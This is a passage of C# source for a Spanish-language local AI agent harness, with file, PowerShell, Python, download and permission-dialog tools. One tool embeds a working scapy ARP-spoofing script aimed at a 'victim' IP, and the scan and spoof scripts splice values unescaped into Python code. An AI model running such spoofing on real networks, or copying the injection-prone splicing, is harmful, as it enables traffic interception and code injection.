        catch (Exception error) when (error is ArgumentException or NotSupportedException or PathTooLongException)
        {
            throw new TerminalException($"Ruta inválida: {rawPath}");
        }

        return path;
    }

    /// <summary>
    /// Saca la ruta REAL de un texto usando el disco como oráculo. Los patrones de ruta Based en
    /// [^\s"']+ cortan en el primer espacio, y acá eso es un problema real: la carpeta del proyecto
    /// se llama "IA 27 T", así que "mejora el index que está en C:\...\IA 27 T\pruebas\FuryTest"
    /// se truncaba a "C:\Users\nicot\OneDrive\Desktop\IA" y se escribía el archivo en el lugar
    /// equivocado. Se toma la coincidencia más larga y se va recortando desde el último espacio hasta
    /// que la ruta exista de verdad. Si nada existe, se devuelve la coincidencia original.
    /// </summary>
    private static string ExtractRealPathFromText(string text)
    {
        var match = ExplicitAbsolutePathPattern.Match(text);
        if (!match.Success)
        {
            match = ExplicitPathPattern.Match(text);
            if (!match.Success)
            {
                return string.Empty;
            }
        }

        var candidate = match.Value.Trim().Trim('"', '\'', ',', ';').TrimEnd('.', ',');
        if (LooksLikeExistingPath(candidate))
        {
            return candidate;
        }

        // Recortar desde el último espacio: "C:\...\IA 27 T\pruebas\FuryTest y haz que" → candidatos más cortos.
        for (var cut = candidate.LastIndexOf(' '); cut > 0; cut = candidate.LastIndexOf(' ', cut - 1))
        {
            var shorter = candidate[..cut].TrimEnd();
            if (shorter.Length > 0 && LooksLikeExistingPath(shorter))
            {
                return shorter;
            }
        }

        return candidate;
    }

    private static bool LooksLikeExistingPath(string path)
    {
        if (string.IsNullOrWhiteSpace(path) || path.Length < 3 || !LooksLikePath(path))
        {
            return false;
        }

        try
        {
            return File.Exists(path) || Directory.Exists(path);
        }
        catch (Exception error) when (error is ArgumentException or NotSupportedException or PathTooLongException or IOException)
        {
            return false;
        }
    }

    private static string ExecuteReadTool(string rawPath)
    {
        var path = ResolveToolPath(rawPath);
        if (Directory.Exists(path))
        {
            var builder = new StringBuilder();
            builder.AppendLine($"Contenido de la carpeta {path}:");
            var count = 0;
            foreach (var directory in Directory.EnumerateDirectories(path))
            {
                if (++count > 150) { builder.AppendLine("... (lista truncada)"); break; }
                builder.AppendLine($"  [carpeta] {Path.GetFileName(directory)}");
            }
            foreach (var file in Directory.EnumerateFiles(path))
            {
                if (++count > 150) { builder.AppendLine("... (lista truncada)"); break; }
                var info = new FileInfo(file);
                builder.AppendLine($"  {Path.GetFileName(file)} ({info.Length:N0} bytes)");
            }

            return count == 0 ? $"La carpeta {path} está vacía." : builder.ToString().TrimEnd();
        }

        if (File.Exists(path))
        {
            string text;
            try
            {
                text = File.ReadAllText(path);
            }
            catch (Exception error) when (error is IOException or UnauthorizedAccessException)
            {
                throw new TerminalException($"No se pudo leer el archivo: {error.Message}");
            }

            if (text.Length > 4000)
            {
                text = text[..4000] + "\n... [contenido truncado: archivo más largo que 4000 caracteres]";
            }

            return $"Contenido de {path}:\n{text}";
        }

        throw new TerminalException($"No existe el archivo ni la carpeta: {path}");
    }

    // Switches de PowerShell (-Recurse, -Force, -Path...) pueden ir ANTES o DESPUÉS de la ruta,
    // y el modelo a veces deja la comilla de apertura sin la de cierre. Este patrón tolera todo eso.
    private const string PsPathArg = @"(?:(?:-\w+(?::\w+)?)\s+)*(?:-Path\s+)?(?:""(?<p1>[^""]+)""?|(?<p2>[^']+)|(?<p3>[^\s]+(?:\s+[^-\s][^\s]*)*?))(?:\s+(?:-\w+(?::\w+)?))*\s*$";

    private static string ExtractPathArg(Match match)
        => (match.Groups["p1"].Value + match.Groups["p2"].Value + match.Groups["p3"].Value).Trim().Trim('"');

    // El 7B conoce cmd.exe mejor que PowerShell y emite "rmdir /s /q X", "del /q X", "rd X":
    // esos comandos NO existen en PowerShell (o son alias de otra cosa) y el bucle de reintento
    // se comía 4 turnos. El host los traduce a Remove-Item antes de mostrar el permiso.
    // Transparencia: el usuario ve el comando YA traducido en la píldora de permiso.
    private static readonly Regex CmdExeRmdirPattern = new(@"^\s*(?:rmdir|rd)\s+(?<rest>.+)$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    private static readonly Regex CmdExeDelPattern = new(@"^\s*(?:del|erase)\s+(?<rest>.+)$", RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static string TranslateCmdExeCommand(string cmd)
    {
        var rmdirMatch = CmdExeRmdirPattern.Match(cmd);
        if (rmdirMatch.Success)
        {
            var rest = rmdirMatch.Groups["rest"].Value;
            var recursive = Regex.IsMatch(rest, @"(?:^|\s)/s(?:\s|$)", RegexOptions.IgnoreCase);
            var path = Regex.Replace(rest, @"(?:^|\s)/[sq](?=\s|$)", " ", RegexOptions.IgnoreCase).Trim().Trim('"');
            if (path.Length >= 2)
            {
                return "Remove-Item -LiteralPath \"" + path + "\"" + (recursive ? " -Recurse" : string.Empty) + " -Force";
            }
        }

        var delMatch = CmdExeDelPattern.Match(cmd);
        if (delMatch.Success)
        {
            var rest = delMatch.Groups["rest"].Value;
            var path = Regex.Replace(rest, @"(?:^|\s)/[a-z]+(?=\s|$)", " ", RegexOptions.IgnoreCase).Trim().Trim('"');
            if (path.Length >= 2)
            {
                return "Remove-Item -LiteralPath \"" + path + "\" -Force";
            }
        }

        return cmd;
    }

    private static string? TryConvertCmdToPython(string command)
    {
        var cmd = command.Trim();

        var createDirMatch = Regex.Match(cmd, @"^\s*(?:New-Item|mkdir|md)\s+(?:(?:-ItemType\s+Directory)\s+)?(?:(?:-\w+(?::\w+)?)\s+)*(?:-Path\s+)?(?:""(?<p1>[^""]+)""?|(?<p2>[^']+)|(?<p3>.+?))(?:\s+(?:-\w+(?::\w+)?))*\s*$", RegexOptions.IgnoreCase);
        if (createDirMatch.Success)
        {
            var path = ExtractPathArg(createDirMatch);
            if (path.Length >= 3)
            {
                return "import os\nos.makedirs(\"" + path + "\", exist_ok=True)\nprint('OK: carpeta creada')";
            }
        }

        var moveMatch = Regex.Match(cmd, @"^\s*Move-Item\s+(?:(?:-\w+(?::\w+)?)\s+)*(?:-Path\s+)?(?:""(?<s1>[^""]+)""?|(?<s2>[^']+)|(?<s3>[^\s]+(?:\s+[^-\s][^\s]*)*?))\s+(?:-Destination\s+)?(?:""(?<d1>[^""]+)""?|(?<d2>[^']+)|(?<d3>.+?))(?:\s+(?:-\w+(?::\w+)?))*\s*$", RegexOptions.IgnoreCase);
        if (moveMatch.Success)
        {
            var source = (moveMatch.Groups["s1"].Value + moveMatch.Groups["s2"].Value + moveMatch.Groups["s3"].Value).Trim().Trim('"');
            var dest = (moveMatch.Groups["d1"].Value + moveMatch.Groups["d2"].Value + moveMatch.Groups["d3"].Value).Trim().Trim('"');
            if (source.Length >= 3 && dest.Length >= 3)
            {
                return "import shutil\nshutil.move(\"" + source + "\", \"" + dest + "\")\nprint('OK: carpeta movida')";
            }
        }

        var copyMatch = Regex.Match(cmd, @"^\s*Copy-Item\s+(?:(?:-\w+(?::\w+)?)\s+)*(?:-Path\s+)?(?:""(?<s1>[^""]+)""?|(?<s2>[^']+)|(?<s3>[^\s]+(?:\s+[^-\s][^\s]*)*?))\s+(?:-Destination\s+)?(?:""(?<d1>[^""]+)""?|(?<d2>[^']+)|(?<d3>.+?))(?:\s+(?:-\w+(?::\w+)?))*\s*$", RegexOptions.IgnoreCase);
        if (copyMatch.Success)
        {
            var source = (copyMatch.Groups["s1"].Value + copyMatch.Groups["s2"].Value + copyMatch.Groups["s3"].Value).Trim().Trim('"');
            var dest = (copyMatch.Groups["d1"].Value + copyMatch.Groups["d2"].Value + copyMatch.Groups["d3"].Value).Trim().Trim('"');
            if (source.Length >= 3 && dest.Length >= 3)
            {
                return "import shutil\nshutil.copy(\"" + source + "\", \"" + dest + "\")\nprint('OK: copiado')";
            }
        }

        var removeMatch = Regex.Match(cmd, @"^\s*Remove-Item\s+(?:(?:-\w+(?::\w+)?)\s+)*(?:-Path\s+)?(?:""(?<p1>[^""]+)""?|(?<p2>[^']+)|(?<p3>.+?))(?:\s+(?:-\w+(?::\w+)?))*\s*$", RegexOptions.IgnoreCase);
        if (removeMatch.Success)
        {
            var path = ExtractPathArg(removeMatch);
            if (path.Length >= 3 && !path.StartsWith("-"))
            {
                return "import os, shutil\np = \"" + path + "\"\nshutil.rmtree(p) if os.path.isdir(p) else os.remove(p)\nprint('OK: eliminado')";
            }
        }

        return null;
    }

    private static async Task<string> ExecuteCmdToolAsync(string command, CancellationToken cancellationToken)
    {
        var startInfo = new ProcessStartInfo("powershell.exe")
        {
            WorkingDirectory = Environment.CurrentDirectory,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            StandardOutputEncoding = Encoding.UTF8,
            StandardErrorEncoding = Encoding.UTF8
        };
        startInfo.ArgumentList.Add("-NoProfile");
        startInfo.ArgumentList.Add("-NonInteractive");
        startInfo.ArgumentList.Add("-Command");
        startInfo.ArgumentList.Add(command);

        using var process = Process.Start(startInfo) ?? throw new TerminalException("No se pudo iniciar PowerShell.");
        using var timeout = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        timeout.CancelAfter(TimeSpan.FromSeconds(30));
        var outputTask = process.StandardOutput.ReadToEndAsync(timeout.Token);
        var errorTask = process.StandardError.ReadToEndAsync(timeout.Token);
        try
        {
            await process.WaitForExitAsync(timeout.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            try { process.Kill(entireProcessTree: true); } catch (InvalidOperationException) { }
            return $"El comando excedió el límite de 30 segundos y fue detenido: {command}";
        }

        var output = (await outputTask).Trim();
        var error = (await errorTask).Trim();
        var builder = new StringBuilder();
        builder.AppendLine($"Comando ejecutado (carpeta {Environment.CurrentDirectory}): {command}");
        builder.AppendLine($"Código de salida: {process.ExitCode}");
        if (output.Length > 0)
        {
            builder.AppendLine("Salida:");
            builder.AppendLine(Truncate(output, 2000));
        }

        if (error.Length > 0)
        {
            builder.AppendLine("Errores:");
            builder.AppendLine(Truncate(error, 1000));
        }

        if (output.Length == 0 && error.Length == 0)
        {
            builder.AppendLine("(sin salida)");
        }

        return builder.ToString().TrimEnd();
    }

    private static async Task<string> ExecutePyToolAsync(string code, CancellationToken cancellationToken)
    {
        var pythonExe = ResolvePythonPath();
        if (pythonExe is null)
        {
            return "ERROR: no se encontró Python en el sistema. Instalá Python 3.x desde python.org o configurá la ruta con: portable.exe config set python-path \"C:\\Python312\\python.exe\"";
        }

        var startInfo = new ProcessStartInfo(pythonExe)
        {
            WorkingDirectory = Environment.CurrentDirectory,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            StandardOutputEncoding = Encoding.UTF8,
            StandardErrorEncoding = Encoding.UTF8
        };
        startInfo.ArgumentList.Add("-c");
        startInfo.ArgumentList.Add(code);

        using var process = Process.Start(startInfo) ?? throw new TerminalException("No se pudo iniciar Python.");
        using var timeout = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        timeout.CancelAfter(TimeSpan.FromSeconds(30));
        var outputTask = process.StandardOutput.ReadToEndAsync(timeout.Token);
        var errorTask = process.StandardError.ReadToEndAsync(timeout.Token);
        try
        {
            await process.WaitForExitAsync(timeout.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            try { process.Kill(entireProcessTree: true); } catch (InvalidOperationException) { }
            return "El código Python excedió el límite de 30 segundos y fue detenido.";
        }

        var output = (await outputTask).Trim();
        var error = (await errorTask).Trim();
        var builder = new StringBuilder();
        builder.AppendLine($"Código Python ejecutado (carpeta {Environment.CurrentDirectory}):");
        builder.AppendLine(Truncate(code, 500));
        builder.AppendLine($"Código de salida: {process.ExitCode}");
        if (output.Length > 0)
        {
            builder.AppendLine("Salida:");
            builder.AppendLine(Truncate(output, 2000));
        }

        if (error.Length > 0)
        {
            builder.AppendLine("Errores:");
            builder.AppendLine(Truncate(error, 1000));
        }

        if (output.Length == 0 && error.Length == 0)
        {
            builder.AppendLine("(sin salida)");
        }

        return builder.ToString().TrimEnd();
    }

    private static async Task<string> ExecuteYtdlpToolAsync(string url, string format, CancellationToken cancellationToken)
    {
        var downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
        Directory.CreateDirectory(downloadsPath);
        var outputTemplate = Path.Combine(downloadsPath, "%(title)s.%(ext)s");

        var startInfo = new ProcessStartInfo("yt-dlp.exe")
        {
            WorkingDirectory = downloadsPath,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            StandardOutputEncoding = Encoding.UTF8,
            StandardErrorEncoding = Encoding.UTF8
        };

        if (format == "mp3")
        {
            startInfo.ArgumentList.Add("-x");
            startInfo.ArgumentList.Add("--audio-format");
            startInfo.ArgumentList.Add("mp3");
        }
        else
        {
            startInfo.ArgumentList.Add("-f");
            startInfo.ArgumentList.Add(format);
        }

        startInfo.ArgumentList.Add("-o");
        startInfo.ArgumentList.Add(outputTemplate);
        startInfo.ArgumentList.Add(url);

        using var process = Process.Start(startInfo) ?? throw new TerminalException("No se pudo iniciar yt-dlp. Instalalo con: winget install yt-dlp.yt-dlp");
        using var timeout = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        timeout.CancelAfter(TimeSpan.FromMinutes(10));
        var outputTask = process.StandardOutput.ReadToEndAsync(timeout.Token);
        var errorTask = process.StandardError.ReadToEndAsync(timeout.Token);
        try
        {
            await process.WaitForExitAsync(timeout.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            try { process.Kill(entireProcessTree: true); } catch (InvalidOperationException) { }
            return "La descarga excedió el límite de 10 minutos y fue detenida.";
        }

        var output = (await outputTask).Trim();
        var error = (await errorTask).Trim();
        var builder = new StringBuilder();
        builder.AppendLine($"Descarga con yt-dlp (carpeta {downloadsPath}):");
        builder.AppendLine($"URL: {url}");
        builder.AppendLine($"Formato: {format}");
        builder.AppendLine($"Código de salida: {process.ExitCode}");
        if (output.Length > 0)
        {
            builder.AppendLine("Salida:");
            builder.AppendLine(Truncate(output, 2000));
        }

        if (error.Length > 0)
        {
            builder.AppendLine("Errores:");
            builder.AppendLine(Truncate(error, 1000));
        }

        return builder.ToString().TrimEnd();
    }

    private static async Task<string> ExecuteScanToolAsync(string range, CancellationToken cancellationToken)
    {
        var pythonExe = ResolvePythonPath();
        if (pythonExe is null)
        {
            return "ERROR: no se encontró Python en el sistema.";
        }

        var script = @"
from scapy.all import ARP, Ether, srp
paquete = Ether(dst=""ff:ff:ff:ff:ff:ff"") / ARP(pdst=""" + range + @")
resultado, _ = srp(paquete, timeout=2, verbose=False)
for _, respuesta in resultado:
    print(f""IP: {respuesta.psrc} - MAC: {respuesta.hwsrc}"")
";

        var startInfo = new ProcessStartInfo(pythonExe)
        {
            WorkingDirectory = Environment.CurrentDirectory,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            StandardOutputEncoding = Encoding.UTF8,
            StandardErrorEncoding = Encoding.UTF8
        };
        startInfo.ArgumentList.Add("-c");
        startInfo.ArgumentList.Add(script);

        using var process = Process.Start(startInfo) ?? throw new TerminalException("No se pudo iniciar Python.");
        using var timeout = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        timeout.CancelAfter(TimeSpan.FromSeconds(30));
        var outputTask = process.StandardOutput.ReadToEndAsync(timeout.Token);
        var errorTask = process.StandardError.ReadToEndAsync(timeout.Token);
        try
        {
            await process.WaitForExitAsync(timeout.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            try { process.Kill(entireProcessTree: true); } catch (InvalidOperationException) { }
            return "El escaneo excedió el límite de 30 segundos y fue detenido.";
        }

        var output = (await outputTask).Trim();
        var error = (await errorTask).Trim();
        var builder = new StringBuilder();
        builder.AppendLine($"Escaneo ARP de la red local (rango {range}):");
        builder.AppendLine($"Código de salida: {process.ExitCode}");
        if (output.Length > 0)
        {
            builder.AppendLine("Dispositivos encontrados:");
            builder.AppendLine(output);
        }

        if (error.Length > 0)
        {
            builder.AppendLine("Errores:");
            builder.AppendLine(Truncate(error, 1000));
        }

        if (output.Length == 0 && error.Length == 0)
        {
            builder.AppendLine("(sin resultados)");
        }

        return builder.ToString().TrimEnd();
    }

    private static async Task<string> ExecuteSpoofToolAsync(string victimIp, string routerIp, string iface, CancellationToken cancellationToken)
    {
        var pythonExe = ResolvePythonPath();
        if (pythonExe is null)
        {
            return "ERROR: no se encontró Python en el sistema.";
        }

        var script = @"
from scapy.all import ARP, send, get_if_hwaddr
import time, sys

victim_ip = """ + victimIp + @"
router_ip = """ + routerIp + @"
interface = """ + iface + @"

mac_atacante = get_if_hwaddr(interface)
paquete_victima = ARP(op=2, pdst=victim_ip, hwdst=""ff:ff:ff:ff:ff:ff"", psrc=router_ip, hwsrc=mac_atacante)
paquete_router = ARP(op=2, pdst=router_ip, hwdst=""ff:ff:ff:ff:ff:ff"", psrc=victim_ip, hwsrc=mac_atacante)

print(f""Envenenando ARP: {victim_ip} y {router_ip} via {interface}"")
print(""Presiona Ctrl+C para detener."")
try:
    while True:
        send(paquete_victima, verbose=False)
        send(paquete_router, verbose=False)
        time.sleep(1)
except KeyboardInterrupt:
    print(""\nDetenido."")
";

        var startInfo = new ProcessStartInfo(pythonExe)
        {
            WorkingDirectory = Environment.CurrentDirectory,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            StandardOutputEncoding = Encoding.UTF8,
            StandardErrorEncoding = Encoding.UTF8
        };
        startInfo.ArgumentList.Add("-c");
        startInfo.ArgumentList.Add(script);

        using var process = Process.Start(startInfo) ?? throw new TerminalException("No se pudo iniciar Python.");
        using var timeout = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        timeout.CancelAfter(TimeSpan.FromMinutes(5));
        var outputTask = process.StandardOutput.ReadToEndAsync(timeout.Token);
        var errorTask = process.StandardError.ReadToEndAsync(timeout.Token);
        try
        {
            await process.WaitForExitAsync(timeout.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            try { process.Kill(entireProcessTree: true); } catch (InvalidOperationException) { }
            return "El ataque ARP spoofing excedió el límite de 5 minutos y fue detenido.";
        }

        var output = (await outputTask).Trim();
        var error = (await errorTask).Trim();
        var builder = new StringBuilder();
        builder.AppendLine($"ARP spoofing ejecutado (victima {victimIp}, router {routerIp}, interfaz {iface}):");
        builder.AppendLine($"Código de salida: {process.ExitCode}");
        if (output.Length > 0)
        {
            builder.AppendLine("Salida:");
            builder.AppendLine(Truncate(output, 2000));
        }

        if (error.Length > 0)
        {
            builder.AppendLine("Errores:");
            builder.AppendLine(Truncate(error, 1000));
        }

        return builder.ToString().TrimEnd();
    }

    private static string? ResolvePythonPath()
    {
        if (!string.IsNullOrWhiteSpace(AppConfig.Load().PythonPath))
        {
            var configured = AppConfig.Load().PythonPath;
            if (File.Exists(configured))
            {
                return configured;
            }
        }

        var path = Environment.GetEnvironmentVariable("PATH");
        if (!string.IsNullOrWhiteSpace(path))
        {
            foreach (var dir in path.Split(Path.PathSeparator))
            {
                var candidate = Path.Combine(dir.Trim(), "python.exe");
                if (File.Exists(candidate))
                {
                    return candidate;
                }
            }
        }

        return null;
    }

    private static string ExecuteWriteTool(string rawPath, string body)
    {
        var path = ResolveToolPath(rawPath);

        // Si la ruta es una CARPETA, no se crea un archivo con el nombre de la carpeta. Así pasó con
        // una ruta truncada en un espacio: el modelo pidió "...\IA" y se creó un archivo basura "IA".
        if (Directory.Exists(path))
        {
            throw new TerminalException($"Esa ruta es una CARPETA, no un archivo: \"{path}\". Reemití [[WRITE]] con la ruta INCLUDING el nombre del archivo (por ejemplo \"{Path.Combine(path, "index.html")}\"). No se escribió nada.");        }

        var parent = Path.GetDirectoryName(path);
        if (!string.IsNullOrWhiteSpace(parent))
        {
            Directory.CreateDirectory(parent);
        }

        // Red de contención: si el modelo metió el contenido dentro de un bloque cercado, el archivo
        // NO debe arrancar con "```html". Es un error del modelo, no del pedido del usuario.
        var content = body;
        var fenceHead = content.IndexOf("```", StringComparison.Ordinal);
        if (fenceHead == 0)
        {
            var firstNewLine = content.IndexOf('\n');
            if (firstNewLine > 0)
            {
                content = content[(firstNewLine + 1)..];
            }

            var fenceTail = content.LastIndexOf("```", StringComparison.Ordinal);
            if (fenceTail >= 0)
            {
                content = content[..fenceTail].TrimEnd();
            }
        }

        File.WriteAllText(path, content, new UTF8Encoding(false));
        return $"Archivo escrito: {path} ({new FileInfo(path).Length:N0} bytes).";
    }

    private sealed record PermissionDecision(bool Allowed, string Reason);

    private static string SanitizeReason(string reason)
    {
        if (string.IsNullOrWhiteSpace(reason))
        {
            return string.Empty;
        }
        var r = reason.Replace("\r", " ").Replace("\n", " ");
        r = r.Replace("[[", "[").Replace("]]", "]");
        while (r.Contains("  "))
        {
            r = r.Replace("  ", " ");
        }
        return Truncate(r, 300);
    }

    private enum PermissionOption { Allow, Deny }

    private PermissionDecision AskPermission(string prompt, bool dangerous, CancellationToken ct)
    {
        NotificationHelper.NotifyPermissionRequired(Truncate(prompt, 100));

        // Se necesitan consola REAL en los dos sentidos: con stdin redirigido no
        // hay ReadKey (y se romperían los tests pipeados) y con stdout redirigido
        // CursorLeft lanza "Controlador no válido" al reposicionar los píldoras.
        if (Console.IsInputRedirected || Console.IsOutputRedirected)
        {
            return AskPermissionFallback(prompt, dangerous, ct);
        }

        Console.ForegroundColor = dangerous ? ConsoleColor.Red : ConsoleColor.Yellow;
        if (dangerous)
        {
            Console.WriteLine("[ADVERTENCIA] El comando coincide con un patrón potencialmente destructivo.");
        }

        // El pedido va en SU línea y los píldoras en la siguiente: RenderPills
        // rebobina con CursorLeft=0 y, si compartieran línea, pisarían el texto
        // del pedido (queda "permitir denegar ...rchivo: C:\...").
        Console.WriteLine($"{(dangerous ? "[PELIGRO]" : "[SOLICITUD]")} {Truncate(prompt, 120)}");
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.WriteLine("  ←/→ mover · enter confirmar · esc denegar · clic en píldora");
        Console.ForegroundColor = ConsoleColor.Cyan;

        var options = new[] { "permitir", "denegar" };
        var selected = 0;
        var keyInfo = new ConsoleKeyInfo();
        var mouseEnabled = !Console.IsInputRedirected && !Console.IsOutputRedirected;

        RenderPills(options, selected);
        while (true)
        {
            keyInfo = Console.ReadKey(true);
            ct.ThrowIfCancellationRequested();

            if (keyInfo.Key == ConsoleKey.LeftArrow)
            {
                selected = (selected - 1 + options.Length) % options.Length;
                RenderPills(options, selected);
            }
            else if (keyInfo.Key == ConsoleKey.RightArrow)
            {
                selected = (selected + 1) % options.Length;
                RenderPills(options, selected);
            }
            else if (keyInfo.Key == ConsoleKey.Enter)
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Cyan;
                if (selected == 0)
                {
                    return new PermissionDecision(true, string.Empty);
                }
                return AskDenialReason(ct);
            }
            else if (keyInfo.Key == ConsoleKey.Escape)
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Cyan;
                return AskDenialReason(ct);
            }
            else if (mouseEnabled && keyInfo.Key == ConsoleKey.F1)
            {
                // F1 = clic en "permitir" (simulado)
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Cyan;
                return new PermissionDecision(true, string.Empty);
            }
            else if (mouseEnabled && keyInfo.Key == ConsoleKey.F2)
            {
                // F2 = clic en "denegar" (simulado)
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Cyan;
                return AskDenialReason(ct);
            }
        }
    }

    private void RenderPills(string[] options, int selected)
    {
        // Redibuja la fila completa en su propia línea (nunca rebobina a la
        // línea del pedido). El layout es constante, así que no quedan restos.
        // Cada CursorLeft va envuelto: si la consola no lo admite, el permiso
        // tiene que seguir funcionando igual (a lo sumo queda desalineado).
        var col = 0;
        for (int i = 0; i < options.Length; i++)
        {
            var label = $" {options[i]} ";
            if (!TrySetCursorLeft(col))
            {
                return;
            }

            if (i == selected)
            {
                Console.BackgroundColor = ConsoleColor.DarkCyan;
                Console.ForegroundColor = ConsoleColor.Black;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
            }

            Console.Write(label);
            Console.ResetColor();
            col += label.Length;

            if (i < options.Length - 1)
            {
                Console.Write("   ");
                col += 3;
            }
        }
    }

    private static bool TrySetCursorLeft(int left)
    {
        try
        {
            Console.CursorLeft = left;
            return true;
        }
        catch (Exception)
        {
            // "Controlador no válido" con stdout redirigido (verificado 28/9):
            // mejor dejar de reposicionar que romper el diálogo de permiso.
            return false;
        }
    }

    private PermissionDecision AskDenialReason(CancellationToken ct)
    {
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.Write("  ¿Por qué no? (una línea, opcional): ");
        Console.ForegroundColor = ConsoleColor.White;
        var reason = Console.ReadLine()?.Trim() ?? string.Empty;
        Console.ForegroundColor = ConsoleColor.Cyan;
        ct.ThrowIfCancellationRequested();
        if (reason.Length > 0)
        {
            return new PermissionDecision(false, SanitizeReason(reason));
        }
        return new PermissionDecision(false, string.Empty);
    }

    private PermissionDecision AskPermissionFallback(string prompt, bool dangerous, CancellationToken ct)
    {
        Console.ForegroundColor = dangerous ? ConsoleColor.Red : ConsoleColor.Yellow;
        if (dangerous)
        {
            Console.WriteLine("[ADVERTENCIA] El comando coincide con un patrón potencialmente destructivo.");
        }

        Console.Write($"{(dangerous ? "[PELIGRO]" : "[SOLICITUD]")} {Truncate(prompt, 120)} ¿Permitir? (s/n, o \"n <motivo>\"): ");
        Console.ForegroundColor = ConsoleColor.White;
        var line = Console.ReadLine();
        Console.ForegroundColor = ConsoleColor.Cyan;
        ct.ThrowIfCancellationRequested();

        var text = line?.Trim() ?? string.Empty;
        if (text.Length == 0)
        {
            return new PermissionDecision(false, string.Empty);
        }

        var parts = text.Split(new[] { ' ' }, 2);
        var firstToken = parts[0].TrimEnd(',', '.', ';', ':', '!', '¡', '?', '¿');
        var firstLower = firstToken.ToLowerInvariant();

        var allowSet = new HashSet<string> { "s", "si", "sí", "y", "yes" };
        var denyWithReasonSet = new HashSet<string> { "n", "no", "nel", "nope", "nah" };

        if (allowSet.Contains(firstLower))
        {
            return new PermissionDecision(true, string.Empty);
        }

        if (denyWithReasonSet.Contains(firstLower) && parts.Length == 2)
        {
            var reason = parts[1].Trim();
            return new PermissionDecision(false, SanitizeReason(reason));
        }

        return new PermissionDecision(false, string.Empty);
    }

    private static string ComputeDiff(string oldText, string newText, out int added, out int removed)
    {
        if (string.IsNullOrEmpty(oldText) && string.IsNullOrEmpty(newText))
        {
            added = 0; removed = 0; return string.Empty;
        }
        if (string.IsNullOrEmpty(oldText))
        {
            added = newText.Length; removed = 0;
            return "+ " + newText.Replace("\r", "").Replace("\n", "\n+ ");
        }
        if (string.IsNullOrEmpty(newText))
        {
            added = 0; removed = oldText.Length;
            return "- " + oldText.Replace("\r", "").Replace("\n", "\n- ");
        }

        var oldLines = oldText.Replace("\r", "").Split('\n');
        var newLines = newText.Replace("\r", "").Split('\n');
        var (lcs, path) = ComputeLcsPath(oldLines, newLines);

        var sb = new System.Text.StringBuilder();
        int i = 0, j = 0;
        added = 0; removed = 0;
        foreach (var move in path)
        {
            if (move == 0) // match
            {
                sb.AppendLine("  " + oldLines[i]);
                i++; j++;
            }
            else if (move == 1) // delete from old
            {
                sb.AppendLine("- " + oldLines[i]);
                removed += oldLines[i].Length + 1;
                i++;
            }
            else if (move == 2) // insert from new
            {
                sb.AppendLine("+ " + newLines[j]);
                added += newLines[j].Length + 1;
                j++;
            }
        }
        return sb.ToString().TrimEnd();
    }

    private static (int lcsLen, List<int> path) ComputeLcsPath(string[] a, string[] b)
    {
        int m = a.Length, n = b.Length;
        var dp = new int[m + 1, n + 1];
        var dir = new byte[m + 1, n + 1]; // 0=match, 1=up, 2=left

        for (int i = 1; i <= m; i++)
        {
            for (int j = 1; j <= n; j++)
            {
                if (a[i - 1] == b[j - 1])
                {
                    dp[i, j] = dp[i - 1, j - 1] + 1;
                    dir[i, j] = 0;
                }
                else if (dp[i - 1, j] > dp[i, j - 1])
                {
                    dp[i, j] = dp[i - 1, j];
                    dir[i, j] = 1;
                }
                else
                {
                    dp[i, j] = dp[i, j - 1];
                    dir[i, j] = 2;
                }
            }
        }

        var path = new List<int>();
        int x = m, y = n;
        while (x > 0 || y > 0)
        {
            if (x > 0 && y > 0 && dir[x, y] == 0)
            {
                path.Add(0); x--; y--;
            }
            else if (x > 0 && (y == 0 || dir[x, y] == 1))
            {
                path.Add(1); x--;
            }
            else
            {
                path.Add(2); y--;
            }
        }
        path.Reverse();
        return (dp[m, n], path);
    }

    private static string BuildDiffHeader(string path, string newContent)
    {
        int oldSize = 0;
        string oldContent = string.Empty;
        if (File.Exists(path))
        {
            try { oldContent = File.ReadAllText(path); oldSize = oldContent.Length; } catch { }
        }
        int newSize = newContent.Length;
        var diff = ComputeDiff(oldContent, newContent, out int added, out int removed);
        var header = $"{oldSize} b → {newSize} b  ·  +{added} −{removed}";
        return $"{header}\n{diff}";
    }

    private static string BuildDeniedMessage(string what, string target, string reason, bool isRepeat)
    {
        var head = isRepeat
            ? "[SISTEMA · el usuario denegó " + what + " (repetida)]"
            : "[SISTEMA · el usuario denegó " + what + "]";
        var reasonBlock = string.IsNullOrWhiteSpace(reason) ? string.Empty : "\nMotivo del usuario: \"" + reason + "\"";
        var instruction = isRepeat
            ? "\nYa le negaste esto antes. Motivo: \"" + reason + "\". NO vuelvas a emitir el marcador ni a insistir. Decile al usuario que lo negaste y por qué, y preguntale cómo seguir."
